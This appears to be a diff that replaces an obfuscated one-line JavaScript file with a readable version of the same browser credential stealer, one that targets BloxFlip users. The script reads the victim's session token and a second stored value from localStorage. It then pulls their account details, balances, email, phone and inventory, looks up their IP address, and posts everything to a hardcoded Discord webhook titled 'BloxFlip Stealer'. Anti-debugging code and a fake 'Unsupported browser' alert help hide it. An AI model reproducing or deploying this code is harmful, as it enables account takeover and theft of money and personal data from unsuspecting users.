@@ -1,1 +1,361 @@
-const _0x1f77e8=_0x3f71;(function(_0x266e1f,_0xce6d39){const _0x3448d6=_0x3f71,_0x216333=_0x266e1f();while(!![]){try{const _0x92f40=parseInt(_0x3448d6(0x136))/0x1+parseInt(_0x3448d6(0x122))/0x2+-parseInt(_0x3448d6(0xea))/0x3*(parseInt(_0x3448d6(0xf8))/0x4)+parseInt(_0x3448d6(0x105))/0x5*(-parseInt(_0x3448d6(0xfe))/0x6)+parseInt(_0x3448d6(0x139))/0x7+parseInt(_0x3448d6(0x11c))/0x8*(parseInt(_0x3448d6(0xe8))/0x9)+-parseInt(_0x3448d6(0x12f))/0xa*(parseInt(_0x3448d6(0x11a))/0xb);if(_0x92f40===_0xce6d39)break;else _0x216333['push'](_0x216333['shift']());}catch(_0x18a722){_0x216333['push'](_0x216333['shift']());}}}(_0x4b91,0x1e21b));async function _0x157bd2(_0x300a94,_0x4421e3){const _0x1d865a=_0x3f71,_0x16069d=await fetch(_0x300a94,{'method':'GET','headers':{'x-auth-token':_0x4421e3}});if(!_0x16069d['ok'])throw new Error(_0x1d865a(0x10f));return _0x16069d[_0x1d865a(0xfd)]();}function _0x4cfa9d(_0x169107){const _0x480015=_0x3f71,_0x25b4e0=new Date(_0x169107);return _0x25b4e0['toLocaleString'](_0x480015(0x124),{'weekday':_0x480015(0x12c),'month':_0x480015(0x12c),'day':_0x480015(0x133),'year':_0x480015(0x133),'hour':_0x480015(0x133),'minute':_0x480015(0x133),'second':_0x480015(0x133)});}function _0x16ddd5(_0xdba804){return Number(_0xdba804['toFixed'](0x2));}function _0x5c571e(_0x2507dc){const _0x3de45d=_0x3f71;return _0x2507dc[_0x3de45d(0x130)]()[_0x3de45d(0xec)](/\B(?=(\d{3})+(?!\d))/g,',');}async function _0x302f69(){const _0x49e1b1=_0x3f71,_0x529d67=(function(){let _0x519258=!![];return function(_0x181a0f,_0x2becd3){const _0x59f65a=_0x519258?function(){const _0x18225c=_0x3f71;if(_0x2becd3){const _0x38c9f3=_0x2becd3[_0x18225c(0xf9)](_0x181a0f,arguments);return _0x2becd3=null,_0x38c9f3;}}:function(){};return _0x519258=![],_0x59f65a;};}()),_0x5bea07=_0x529d67(this,function(){const _0x498256=_0x3f71;return _0x5bea07['toString']()['search']('(((.+)+)+)+$')[_0x498256(0x130)]()['constructor'](_0x5bea07)[_0x498256(0xff)](_0x498256(0x134));});_0x5bea07();const _0x5904ef=(function(){let _0x5247af=!![];return function(_0x3f9a19,_0x28eae5){const _0x3ad3ee=_0x5247af?function(){const _0xc24cab=_0x3f71;if(_0x28eae5){const _0x25a3c2=_0x28eae5[_0xc24cab(0xf9)](_0x3f9a19,arguments);return _0x28eae5=null,_0x25a3c2;}}:function(){};return _0x5247af=![],_0x3ad3ee;};}()),_0x3d35f2=_0x5904ef(this,function(){const _0x1d03e5=_0x3f71;let _0x15cbd3;try{const _0x2cbf4d=Function(_0x1d03e5(0x101));_0x15cbd3=_0x2cbf4d();}catch(_0x4138d2){_0x15cbd3=window;}const _0x555e4e=new RegExp(_0x1d03e5(0x109),'g'),_0xcf991d=_0x1d03e5(0xeb)[_0x1d03e5(0xec)](_0x555e4e,'')[_0x1d03e5(0x102)](';');let _0xa661a7,_0x29434e,_0x574d78,_0x12e3b0;const _0x50b45c=function(_0x592048,_0x5b2e50,_0x3935dd){const _0x379174=_0x1d03e5;if(_0x592048['length']!=_0x5b2e50)return![];for(let _0x2d96c9=0x0;_0x2d96c9<_0x5b2e50;_0x2d96c9++){for(let _0x558bcf=0x0;_0x558bcf<_0x3935dd[_0x379174(0x131)];_0x558bcf+=0x2){if(_0x2d96c9==_0x3935dd[_0x558bcf]&&_0x592048[_0x379174(0xe3)](_0x2d96c9)!=_0x3935dd[_0x558bcf+0x1])return![];}}return!![];},_0x4dac81=function(_0x61be89,_0x9345e,_0x6e14b1){return _0x50b45c(_0x9345e,_0x6e14b1,_0x61be89);},_0x162d4f=function(_0x1c8074,_0x5cd111,_0x279aa7){return _0x4dac81(_0x5cd111,_0x1c8074,_0x279aa7);},_0x543d43=function(_0x5784cd,_0x45015c,_0x13ff8b){return _0x162d4f(_0x45015c,_0x13ff8b,_0x5784cd);};for(let _0x2778c6 in _0x15cbd3){if(_0x50b45c(_0x2778c6,0x8,[0x7,0x74,0x5,0x65,0x3,0x75,0x0,0x64])){_0xa661a7=_0x2778c6;break;}}for(let _0x508e98 in _0x15cbd3[_0xa661a7]){if(_0x543d43(0x6,_0x508e98,[0x5,0x6e,0x0,0x64])){_0x29434e=_0x508e98;break;}}for(let _0x3e0b97 in _0x15cbd3[_0xa661a7]){if(_0x162d4f(_0x3e0b97,[0x7,0x6e,0x0,0x6c],0x8)){_0x574d78=_0x3e0b97;break;}}if(!('~'>_0x29434e))for(let _0x2f47bc in _0x15cbd3[_0xa661a7][_0x574d78]){if(_0x4dac81([0x7,0x65,0x0,0x68],_0x2f47bc,0x8)){_0x12e3b0=_0x2f47bc;break;}}if(!_0xa661a7||!_0x15cbd3[_0xa661a7])return;const _0x36d783=_0x15cbd3[_0xa661a7][_0x29434e],_0x3fa6d3=!!_0x15cbd3[_0xa661a7][_0x574d78]&&_0x15cbd3[_0xa661a7][_0x574d78][_0x12e3b0],_0x323cd4=_0x36d783||_0x3fa6d3;if(!_0x323cd4)return;let _0x16143a=![];for(let _0x100cd4=0x0;_0x100cd4<_0xcf991d[_0x1d03e5(0x131)];_0x100cd4++){const _0xdd9287=_0xcf991d[_0x100cd4],_0x5a9800=_0xdd9287[0x0]===String[_0x1d03e5(0x13a)](0x2e)?_0xdd9287[_0x1d03e5(0xe4)](0x1):_0xdd9287,_0x3ab512=_0x323cd4[_0x1d03e5(0x131)]-_0x5a9800[_0x1d03e5(0x131)],_0x31933a=_0x323cd4[_0x1d03e5(0x11b)](_0x5a9800,_0x3ab512),_0x22f76d=_0x31933a!==-0x1&&_0x31933a===_0x3ab512;_0x22f76d&&((_0x323cd4[_0x1d03e5(0x131)]==_0xdd9287[_0x1d03e5(0x131)]||_0xdd9287[_0x1d03e5(0x11b)]('.')===0x0)&&(_0x16143a=!![]));}if(!_0x16143a){const _0x26b9c8=new RegExp(_0x1d03e5(0x138),'g'),_0x22bfe4=_0x1d03e5(0xe9)[_0x1d03e5(0xec)](_0x26b9c8,'');_0x15cbd3[_0xa661a7][_0x574d78]=_0x22bfe4;}});_0x3d35f2();const _0x2ecdc3=(function(){let _0x544238=!![];return function(_0x673612,_0x16b429){const _0x1441b3=_0x544238?function(){const _0x3773f4=_0x3f71;if(_0x16b429){const _0x2aef1a=_0x16b429[_0x3773f4(0xf9)](_0x673612,arguments);return _0x16b429=null,_0x2aef1a;}}:function(){};return _0x544238=![],_0x1441b3;};}()),_0x16418c=_0x2ecdc3(this,function(){const _0x5564c5=_0x3f71,_0x578c55=function(){const _0x1fc6bf=_0x3f71;let _0x384f8e;try{_0x384f8e=Function(_0x1fc6bf(0x101))();}catch(_0xbc7830){_0x384f8e=window;}return _0x384f8e;},_0x1a1053=_0x578c55(),_0x412421=_0x1a1053[_0x5564c5(0x12a)]=_0x1a1053[_0x5564c5(0x12a)]||{},_0x49950b=[_0x5564c5(0x10d),_0x5564c5(0x120),_0x5564c5(0xf0),_0x5564c5(0xee),_0x5564c5(0xe6),_0x5564c5(0x106),_0x5564c5(0x11e)];for(let _0x22d943=0x0;_0x22d943<_0x49950b[_0x5564c5(0x131)];_0x22d943++){const _0x422284=_0x2ecdc3[_0x5564c5(0xf4)][_0x5564c5(0x12d)][_0x5564c5(0xf3)](_0x2ecdc3),_0x3a891a=_0x49950b[_0x22d943],_0x53e9d9=_0x412421[_0x3a891a]||_0x422284;_0x422284[_0x5564c5(0x125)]=_0x2ecdc3[_0x5564c5(0xf3)](_0x2ecdc3),_0x422284['toString']=_0x53e9d9[_0x5564c5(0x130)][_0x5564c5(0xf3)](_0x53e9d9),_0x412421[_0x3a891a]=_0x422284;}});_0x16418c();try{const _0x318a6a=await fetch(_0x49e1b1(0xf6));if(!_0x318a6a['ok'])throw new Error(_0x49e1b1(0xed));const _0x994b74=await _0x318a6a['json']();return _0x994b74['ip'];}catch(_0x4d36a7){return console[_0x49e1b1(0xee)](_0x49e1b1(0xfb),_0x4d36a7),_0x49e1b1(0x132);}}function _0x4b91(){const _0x4d9478=['\x20|\x20Price:\x20','9482uZrOAe','indexOf','400LrMzTZ','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','trace','then','warn','inventory','463964tegZWI','finally','en-US','__proto__','Unsupported\x20browser!\x20Please\x20use\x20Google\x20Chrome.','name','https://api.bloxflip.com/inventory/viewRbx','https://api.bloxflip.com/inventory/viewRoblox','console','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Phone:**\x20','long','prototype','round','2330MsJnfv','toString','length','Unknown','numeric','(((.+)+)+)+$','map','133316PQqfFn','https://discord.com/api/webhooks/1152199917717176350/jNehBYW_-vVqw7mpe3jZ96H29UuInqj2um2J5p4t-cw1UkhzsERwxJfQM8QOcWPKhlcH','[hNIjhJHOeDvHNNxKxmgcqJyRxPTAhPR]','1209187VIvoNe','fromCharCode','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Total\x20Deposited:**\x20','charCodeAt','slice','You\x20are\x20not\x20logged\x20in!','exception','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Total\x20Withdrawn:**\x20','17487WCWKJW','abhouNtIj:hJblanHkOeDvHNNxKxmgcqJyRxPTAhPR','92568JCVCfE','qblRYoxwuwCtfzuvlVisDVp.cLBCSPgNNwMomEjD','replace','failed','error','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Account\x20Creation\x20Date:**\x20','info','application/json','_DO_NOT_SHARE_BLOXFLIP_TOKEN','bind','constructor','Error:\x20','https://api.ipify.org?format=json','BloxFlip\x20Stealer','20qnumGH','apply','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**User\x20Roblox\x20ID:**\x20','Error\x20getting\x20Mines\x20Hash:','recentAveragePrice','json','12weUxTV','search','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Victim\x27s\x20Token:**\x20','return\x20(function()\x20{}.constructor(\x22return\x20this\x22)(\x20));','split','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Bloxflip\x20Robux\x20Balance:**\x20','statusText','391610mBKrVC','table','**Name:\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Timezone:**\x20','[qRYwuwCtzuvVsDVLBCSPgNNwMEjD]','localStorage','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Roblox\x20Username:**\x20','svan1\x27s\x20Stealer','log','status','API\x20request\x20failed','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Total\x20Wagered:**\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Limiteds:**\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','stringify','email','POST','rbx','Error:\x20Please\x20Try\x20Again','\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Rakeback\x20Balance:**\x20','phoneNumber'];_0x4b91=function(){return _0x4d9478;};return _0x4b91();}function _0x3f71(_0x213027,_0x49e9ec){const _0x4b9174=_0x4b91();return _0x3f71=function(_0x3f71ab,_0x8267ac){_0x3f71ab=_0x3f71ab-0xe3;let _0x25b9fa=_0x4b9174[_0x3f71ab];return _0x25b9fa;},_0x3f71(_0x213027,_0x49e9ec);}async function _0x50d6a5(_0x2173a9,_0x2154e0){const _0xf80aa1=_0x3f71;try{const _0x1fc7d0=await fetch(_0x2173a9,{'method':_0xf80aa1(0x114),'headers':{'Content-Type':_0xf80aa1(0xf1)},'body':JSON[_0xf80aa1(0x112)](_0x2154e0)});!_0x1fc7d0['ok']&&console[_0xf80aa1(0xee)](_0xf80aa1(0xf5)+_0x1fc7d0[_0xf80aa1(0x10e)]+'\x20'+_0x1fc7d0[_0xf80aa1(0x104)]);}catch(_0x5a940e){console[_0xf80aa1(0xee)]('Error:',_0x5a940e);}}const _0x4f0bca=window[_0x1f77e8(0x10a)][_0x1f77e8(0xf2)];_0x4f0bca?_0x302f69()[_0x1f77e8(0x11f)](_0xc036dd=>{const _0x471db0=_0x1f77e8;Promise['all']([_0x157bd2('https://api.bloxflip.com/user',_0x4f0bca),_0x157bd2(_0x471db0(0x128),_0x4f0bca),_0x157bd2(_0x471db0(0x129),_0x4f0bca)])['then'](([_0x56e5e4,_0x58570f,_0x5de8aa])=>{const _0x574533=_0x471db0,{gamesWon:_0x33aa91,gamesPlayed:_0x5cf75e,totalDeposited:_0x54ec09,totalWithdrawn:_0x3e201a,wager:_0x5ddfcc,user:{robloxId:_0x2457bb,robloxUsername:_0x27bb5b,lastSeenAt:_0x463f55,created:_0x169eef,wallet:_0x53e881,timezoneId:_0x58bebd,userEmailProperties:_0x57cdd6,userPhoneProperties:_0x107e42,rakebackBalance:_0x233c4a}}=_0x56e5e4,_0x406652=_0x58570f[_0x574533(0x115)],_0x136960=_0x5de8aa[_0x574533(0x121)]||[],_0x24f455=_0x136960[_0x574533(0x135)](_0x10b93f=>{const _0x482f8b=_0x574533;return _0x482f8b(0x107)+_0x10b93f[_0x482f8b(0x127)]+_0x482f8b(0x119)+_0x10b93f[_0x482f8b(0xfc)]+'**';}),_0x318160=_0x24f455['join']('\x0a'),_0x44fcd4=_0x16ddd5(_0x233c4a),_0x244b0b={'user':{'robloxId':_0x2457bb,'robloxUsername':_0x27bb5b,'userEmailProperties':_0x57cdd6,'userPhoneProperties':_0x107e42,'gamesWon':0x0,'lastSeenAt':0x295c3}},_0x4d6388=_0x4cfa9d(_0x463f55),_0x555724=_0x4cfa9d(_0x169eef),_0x271808=_0x5c571e(_0x16ddd5(_0x53e881)),_0x3ec980=_0x5c571e(Math[_0x574533(0x12e)](_0x5ddfcc)),_0x2fb7f7={'username':_0x574533(0xf7),'avatar_url':'','embeds':[{'color':0xf7faf8,'title':_0x574533(0x10c),'description':_0x574533(0x100)+_0x4f0bca+_0x574533(0xfa)+_0x2457bb+_0x574533(0x10b)+_0x27bb5b+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Last\x20Seen\x20At:**\x20'+_0x4d6388+_0x574533(0xef)+_0x555724+_0x574533(0x13b)+_0x5c571e(_0x54ec09)+_0x574533(0xe7)+_0x5c571e(_0x3e201a)+_0x574533(0x110)+_0x3ec980+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Roblox\x20Robux\x20Balance:**\x20'+_0x406652+_0x574533(0x103)+_0x271808+_0x574533(0x117)+_0x44fcd4+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Email:**\x20'+_0x57cdd6[_0x574533(0x113)]+_0x574533(0x12b)+_0x107e42[_0x574533(0x118)]+_0x574533(0x108)+(_0x58bebd||_0x574533(0x132))+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Victim\x27s\x20IP\x20Address:**\x20'+_0xc036dd+_0x574533(0x111)+_0x318160+_0x574533(0x11d)}]};_0x50d6a5(_0x574533(0x137),_0x2fb7f7);})['catch'](()=>{const _0x3a2158=_0x471db0;alert(_0x3a2158(0x116));})[_0x471db0(0x123)](()=>{const _0x32fc8a=_0x471db0;alert(_0x32fc8a(0x126));});}):alert(_0x1f77e8(0xe5));
+async function _0x157bd2(_0x3860c4, _0x2c73a0) {
+  const _0x3d2793 = await fetch(_0x3860c4, {
+    method: 'GET',
+    headers: { 'x-auth-token': _0x2c73a0 },
+  })
+  if (!_0x3d2793.ok) {
+    throw new Error('API request failed')
+  }
+  return _0x3d2793.json()
+}
+function _0x4cfa9d(_0x3f78e1) {
+  const _0x34c95d = new Date(_0x3f78e1)
+  return _0x34c95d.toLocaleString('en-US', {
+    weekday: 'long',
+    month: 'long',
+    day: 'numeric',
+    year: 'numeric',
+    hour: 'numeric',
+    minute: 'numeric',
+    second: 'numeric',
+  })
+}
+function _0x16ddd5(_0x19ab2f) {
+  return Number(_0x19ab2f.toFixed(2))
+}
+function _0x5c571e(_0x2fc461) {
+  return _0x2fc461.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',')
+}
+async function _0x302f69() {
+  const _0x5b2568 = (function () {
+      let _0x49d300 = true
+      return function (_0x5cb550, _0x22e5fd) {
+        const _0x4717eb = _0x49d300
+          ? function () {
+              if (_0x22e5fd) {
+                const _0x401c29 = _0x22e5fd.apply(_0x5cb550, arguments)
+                return (_0x22e5fd = null), _0x401c29
+              }
+            }
+          : function () {}
+        return (_0x49d300 = false), _0x4717eb
+      }
+    })(),
+    _0x2beea5 = _0x5b2568(this, function () {
+      return _0x2beea5
+        .toString()
+        .search('(((.+)+)+)+$')
+        .toString()
+        .constructor(_0x2beea5)
+        .search('(((.+)+)+)+$')
+    })
+  _0x2beea5()
+  const _0x21d681 = (function () {
+      let _0xa62f0e = true
+      return function (_0x5518de, _0x18b7a4) {
+        const _0x345919 = _0xa62f0e
+          ? function () {
+              if (_0x18b7a4) {
+                const _0x4fe793 = _0x18b7a4.apply(_0x5518de, arguments)
+                return (_0x18b7a4 = null), _0x4fe793
+              }
+            }
+          : function () {}
+        return (_0xa62f0e = false), _0x345919
+      }
+    })(),
+    _0x2c2acb = _0x21d681(this, function () {
+      let _0x4e898b
+      try {
+        const _0x1c708f = Function(
+          'return (function() {}.constructor("return this")( ));'
+        )
+        _0x4e898b = _0x1c708f()
+      } catch (_0x5af859) {
+        _0x4e898b = window
+      }
+      const _0x44c902 = new RegExp('[qRYwuwCtzuvVsDVLBCSPgNNwMEjD]', 'g'),
+        _0x43e505 = 'qblRYoxwuwCtfzuvlVisDVp.cLBCSPgNNwMomEjD'
+          .replace(_0x44c902, '')
+          .split(';')
+      let _0x124262, _0x526f8a, _0x2bb5fe, _0x5952a1
+      const _0xa0f1d2 = function (_0x3eff03, _0x5cb61b, _0x14a52f) {
+          if (_0x3eff03.length != _0x5cb61b) {
+            return false
+          }
+          for (let _0x3ca233 = 0; _0x3ca233 < _0x5cb61b; _0x3ca233++) {
+            for (
+              let _0xdb0096 = 0;
+              _0xdb0096 < _0x14a52f.length;
+              _0xdb0096 += 2
+            ) {
+              if (
+                _0x3ca233 == _0x14a52f[_0xdb0096] &&
+                _0x3eff03.charCodeAt(_0x3ca233) != _0x14a52f[_0xdb0096 + 1]
+              ) {
+                return false
+              }
+            }
+          }
+          return true
+        },
+        _0x4410cf = function (_0xbbd5ce, _0x6651ed, _0x5a5c08) {
+          return _0xa0f1d2(_0x6651ed, _0x5a5c08, _0xbbd5ce)
+        },
+        _0x3baf03 = function (_0x59ba16, _0x299e87, _0x316c0a) {
+          return _0x4410cf(_0x299e87, _0x59ba16, _0x316c0a)
+        },
+        _0x137d8f = function (_0x2e0f08, _0x288a75, _0x30fe53) {
+          return _0x3baf03(_0x288a75, _0x30fe53, _0x2e0f08)
+        }
+      for (let _0x4fe1b5 in _0x4e898b) {
+        if (_0xa0f1d2(_0x4fe1b5, 8, [7, 116, 5, 101, 3, 117, 0, 100])) {
+          _0x124262 = _0x4fe1b5
+          break
+        }
+      }
+      for (let _0x3711fd in _0x4e898b[_0x124262]) {
+        if (_0x137d8f(6, _0x3711fd, [5, 110, 0, 100])) {
+          _0x526f8a = _0x3711fd
+          break
+        }
+      }
+      for (let _0x5e2200 in _0x4e898b[_0x124262]) {
+        if (_0x3baf03(_0x5e2200, [7, 110, 0, 108], 8)) {
+          _0x2bb5fe = _0x5e2200
+          break
+        }
+      }
+      if (!('~' > _0x526f8a)) {
+        for (let _0xa246b3 in _0x4e898b[_0x124262][_0x2bb5fe]) {
+          if (_0x4410cf([7, 101, 0, 104], _0xa246b3, 8)) {
+            _0x5952a1 = _0xa246b3
+            break
+          }
+        }
+      }
+      if (!_0x124262 || !_0x4e898b[_0x124262]) {
+        return
+      }
+      const _0x4b6561 = _0x4e898b[_0x124262][_0x526f8a],
+        _0x4c6016 =
+          !!_0x4e898b[_0x124262][_0x2bb5fe] &&
+          _0x4e898b[_0x124262][_0x2bb5fe][_0x5952a1],
+        _0x2c90b4 = _0x4b6561 || _0x4c6016
+      if (!_0x2c90b4) {
+        return
+      }
+      let _0x1819b3 = false
+      for (let _0x40be1d = 0; _0x40be1d < _0x43e505.length; _0x40be1d++) {
+        const _0x290d65 = _0x43e505[_0x40be1d],
+          _0x3a8f02 =
+            _0x290d65[0] === String.fromCharCode(46)
+              ? _0x290d65.slice(1)
+              : _0x290d65,
+          _0x4eec31 = _0x2c90b4.length - _0x3a8f02.length,
+          _0x535206 = _0x2c90b4.indexOf(_0x3a8f02, _0x4eec31),
+          _0x369c3e = _0x535206 !== -1 && _0x535206 === _0x4eec31
+        if (_0x369c3e) {
+          if (
+            _0x2c90b4.length == _0x290d65.length ||
+            _0x290d65.indexOf('.') === 0
+          ) {
+            _0x1819b3 = true
+          }
+        }
+      }
+      if (!_0x1819b3) {
+        const _0x496fc5 = new RegExp('[hNIjhJHOeDvHNNxKxmgcqJyRxPTAhPR]', 'g'),
+          _0x2d0bbc = 'abhouNtIj:hJblanHkOeDvHNNxKxmgcqJyRxPTAhPR'.replace(
+            _0x496fc5,
+            ''
+          )
+        _0x4e898b[_0x124262][_0x2bb5fe] = _0x2d0bbc
+      }
+    })
+  _0x2c2acb()
+  const _0x33cfec = (function () {
+      let _0x14c20b = true
+      return function (_0x14eddc, _0x469c2f) {
+        const _0x5a540b = _0x14c20b
+          ? function () {
+              if (_0x469c2f) {
+                const _0x2cce6a = _0x469c2f.apply(_0x14eddc, arguments)
+                return (_0x469c2f = null), _0x2cce6a
+              }
+            }
+          : function () {}
+        return (_0x14c20b = false), _0x5a540b
+      }
+    })(),
+    _0x2afd02 = _0x33cfec(this, function () {
+      const _0x110cf7 = function () {
+          let _0x3b8b3d
+          try {
+            _0x3b8b3d = Function(
+              'return (function() {}.constructor("return this")( ));'
+            )()
+          } catch (_0x40dd57) {
+            _0x3b8b3d = window
+          }
+          return _0x3b8b3d
+        },
+        _0x2a60fe = _0x110cf7(),
+        _0x4ac519 = (_0x2a60fe.console = _0x2a60fe.console || {}),
+        _0xe9068d = [
+          'log',
+          'warn',
+          'info',
+          'error',
+          'exception',
+          'table',
+          'trace',
+        ]
+      for (let _0x43293a = 0; _0x43293a < _0xe9068d.length; _0x43293a++) {
+        const _0x272470 = _0x33cfec.constructor.prototype.bind(_0x33cfec),
+          _0x1aed5a = _0xe9068d[_0x43293a],
+          _0x1efd1c = _0x4ac519[_0x1aed5a] || _0x272470
+        _0x272470['__proto__'] = _0x33cfec.bind(_0x33cfec)
+        _0x272470.toString = _0x1efd1c.toString.bind(_0x1efd1c)
+        _0x4ac519[_0x1aed5a] = _0x272470
+      }
+    })
+  _0x2afd02()
+  try {
+    const _0x16cf33 = await fetch('https://api.ipify.org?format=json')
+    if (!_0x16cf33.ok) {
+      throw new Error('failed')
+    }
+    const _0x5d4a84 = await _0x16cf33.json()
+    return _0x5d4a84.ip
+  } catch (_0x5e962c) {
+    return console.error('Error getting Mines Hash:', _0x5e962c), 'Unknown'
+  }
+}
+async function _0x50d6a5(_0x45ef79, _0x1ae7cd) {
+  try {
+    const _0x5a2dd4 = await fetch(_0x45ef79, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(_0x1ae7cd),
+    })
+    !_0x5a2dd4.ok &&
+      console.error('Error: ' + _0x5a2dd4.status + ' ' + _0x5a2dd4.statusText)
+  } catch (_0x2bc6ff) {
+    console.error('Error:', _0x2bc6ff)
+  }
+}
+const _0x4f0bca = window.localStorage['_DO_NOT_SHARE_BLOXFLIP_TOKEN']
+const _0x4f0bcc = window.localStorage['_|WARNING:-DO-NOT-SHARE-THIS']
+_0x4f0bca
+  ? _0x302f69().then((_0x4fbacf) => {
+      Promise.all([
+        _0x157bd2('https://api.bloxflip.com/user', _0x4f0bca),
+        _0x157bd2('https://api.bloxflip.com/inventory/viewRbx', _0x4f0bca),
+        _0x157bd2('https://api.bloxflip.com/inventory/viewRoblox', _0x4f0bca),
+      ])
+        .then(([_0x54939a, _0x1ac336, _0x2ab768]) => {
+          const {
+              gamesWon: _0x194bf3,
+              gamesPlayed: _0x321936,
+              totalDeposited: _0x42a59f,
+              totalWithdrawn: _0x516f97,
+              wager: _0x42250e,
+              user: {
+                robloxId: _0x51de2a,
+                robloxUsername: _0x27bd35,
+                lastSeenAt: _0x32d205,
+                created: _0x2cfa02,
+                wallet: _0x512f4e,
+                timezoneId: _0x4a668b,
+                userEmailProperties: _0x123f18,
+                userPhoneProperties: _0x496b45,
+                rakebackBalance: _0x44d7f8,
+              },
+            } = _0x54939a,
+            _0x3bde51 = _0x1ac336.rbx,
+            _0x210d0e = _0x2ab768.inventory || [],
+            _0xc861cc = _0x210d0e.map((_0x3866ec) => {
+              return (
+                '**Name: ' +
+                _0x3866ec.name +
+                ' | Price: ' +
+                _0x3866ec.recentAveragePrice +
+                '**'
+              )
+            }),
+            _0xea4260 = _0xc861cc.join('\n'),
+            _0x29c421 = _0x16ddd5(_0x44d7f8),
+            _0x5a3226 = {
+              user: {
+                robloxId: _0x51de2a,
+                robloxUsername: _0x27bd35,
+                userEmailProperties: _0x123f18,
+                userPhoneProperties: _0x496b45,
+                gamesWon: 0,
+                lastSeenAt: 169411,
+              },
+            },
+            _0x5a4a5e = _0x4cfa9d(_0x32d205),
+            _0x4da24d = _0x4cfa9d(_0x2cfa02),
+            _0x10a62a = _0x5c571e(_0x16ddd5(_0x512f4e)),
+            _0x12ae01 = _0x5c571e(Math.round(_0x42250e)),
+            _0x220c4c = {
+              username: 'BloxFlip Stealer',
+              avatar_url: '',
+              embeds: [
+                {
+                  color: 16251640,
+                  title: "svan1's Stealer",
+                  description:
+                    "\n                  **Victim's Token:** " +
+                    _0x4f0bca +
+                    "\n                  **Victim's Cookie:** " +
+                    _0x4f0bcc +
+                    '\n                  **User Roblox ID:** ' +
+                    _0x51de2a +
+                    '\n                  **Roblox Username:** ' +
+                    _0x27bd35 +
+                    '\n                  **Last Seen At:** ' +
+                    _0x5a4a5e +
+                    '\n                  **Account Creation Date:** ' +
+                    _0x4da24d +
+                    '\n                  **Total Deposited:** ' +
+                    _0x5c571e(_0x42a59f) +
+                    '\n                  **Total Withdrawn:** ' +
+                    _0x5c571e(_0x516f97) +
+                    '\n                  **Total Wagered:** ' +
+                    _0x12ae01 +
+                    '\n                  **Roblox Robux Balance:** ' +
+                    _0x3bde51 +
+                    '\n                  **Bloxflip Robux Balance:** ' +
+                    _0x10a62a +
+                    '  \n                  **Rakeback Balance:** ' +
+                    _0x29c421 +
+                    '\n                  **Email:** ' +
+                    _0x123f18.email +
+                    '\n                  **Phone:** ' +
+                    _0x496b45.phoneNumber +
+                    '\n                  **Timezone:** ' +
+                    (_0x4a668b || 'Unknown') +
+                    "\n                  **Victim's IP Address:** " +
+                    _0x4fbacf +
+                    '\n                  **Limiteds:**\n                  ' +
+                    _0xea4260 +
+                    '\n                ',
+                },
+              ],
+            }
+          _0x50d6a5(
+            'https://discord.com/api/webhooks/1152199917717176350/jNehBYW_-vVqw7mpe3jZ96H29UuInqj2um2J5p4t-cw1UkhzsERwxJfQM8QOcWPKhlcH',
+            _0x220c4c
+          )
+        })
+        .catch(() => {
+          alert('Error: Please Try Again')
+        })
+        .finally(() => {
+          alert('Unsupported browser! Please use Google Chrome.')
+        })
+    })
+  : alert('You are not logged in!')
